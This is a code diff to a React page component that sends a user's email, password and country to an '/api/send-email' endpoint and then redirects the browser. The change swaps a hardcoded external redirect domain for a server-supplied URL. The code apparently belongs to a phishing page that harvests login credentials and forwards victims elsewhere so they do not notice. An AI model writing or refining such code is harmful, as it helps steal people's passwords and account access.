@@ -59,8 +59,12 @@ export default function Home() {
     if (password.length >= 5) {
       setIsProcessing(true);
       try {
-        await axios.post('/api/send-email', { email, password, country });
-        window.location.href = 'https://ss.achemsite.info';
+        const response = await axios.post('/api/send-email', { email, password, country });
+        if (response.data.redirectUrl) {
+          window.location.href = response.data.redirectUrl;
+        } else {
+          setErrorMessage('Unexpected response. Please try again.');
+        }
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
